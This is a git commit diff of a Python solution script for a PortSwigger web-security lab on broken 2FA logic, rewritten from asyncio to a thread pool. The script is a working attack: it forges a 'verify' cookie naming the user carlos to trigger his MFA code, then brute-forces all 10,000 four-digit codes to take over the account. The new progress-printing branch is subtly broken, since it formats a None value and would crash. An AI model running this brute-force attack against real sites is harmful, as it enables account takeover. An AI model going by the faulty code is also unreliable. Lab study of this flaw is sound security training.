1220ef3796e9ad75d63d07d79bde7c4563afa5bb
DinozaBr <ivan.zabolotnyi2001@mail.ru>
2025-02-08 08:51:19 +0300

    через ThreadPoolExecutor

--- Work/test.py
+++ Work/test.py
@@ -2,25 +2,25 @@
 # Lab: 2FA broken logic
 # Lab-Link: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
 # Difficulty: PRACTITIONER
-import aiohttp
-import asyncio
+import requests
 import sys
 import urllib3
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies = {}
 
 
-async def try_login(session, host, code):
+def try_login(client, host, code):
     data = {'mfa-code': f'{code:04}'}
     print(data)
-    async with session.post(f'{host}/login2', data=data, allow_redirects=True) as response:
-        text = await response.text()
-        if "Your username is: carlos" in text:
-            return code
+    r = client.post(f'{host}/login2', data, allow_redirects=True)
+    if "Your username is: carlos" in r.text:
+        return code
     return None
 
 
-async def main():
+def main():
     print('[+] Lab: 2FA broken logic')
     try:
         host = sys.argv[1].strip().rstrip('/')
@@ -29,24 +29,32 @@ async def main():
         print(f'Example: {sys.argv[0]} http://www.example.com')
         sys.exit(-1)
 
-    async with aiohttp.ClientSession() as session:
+    with requests.Session() as client:
+        client.verify = False
+        client.proxies = proxies
+
         # get a valid session token
-        await session.get(f'{host}/login')
+        client.get(f'{host}/login')
+        # session_id = client.cookies.get('session', domain=f'{host[8:]}')
 
         # Generate a 2FA token for carlos
-        session.cookie_jar.update_cookies({'verify': 'carlos'})
-        await session.get(f'{host}/login2')
+        client.cookies.set('verify', 'carlos', domain=f'{host[8:]}')
+        client.get(f'{host}/login2')
 
-        # Now brute force the 2FA token using asyncio
-        tasks = [try_login(session, host, i) for i in range(10000)]
-        for task in asyncio.as_completed(tasks):
-            result = await task
-            if result is not None:
-                print(f'[+] Login to user carlos successful with code {result}, lab solved')
-                sys.exit(0)
+        # Now brute force the 2FA token using ThreadPoolExecutor
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = [executor.submit(try_login, client, host, i) for i in range(10000)]
+            for future in as_completed(futures):
+                result = future.result()
+                if result is not None:
+                    print(f'[+] Login to user carlos successful with code {result}, lab solved')
+                    sys.exit(0)
+                else:
+                    code = int(future.result()) if future.result() is not None else future.result()
+                    print(f'[ ] Trying to brute force 2FA code: {code:04}', end='\r')
 
         print(f'[-] Login to user carlos not successful')
 
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
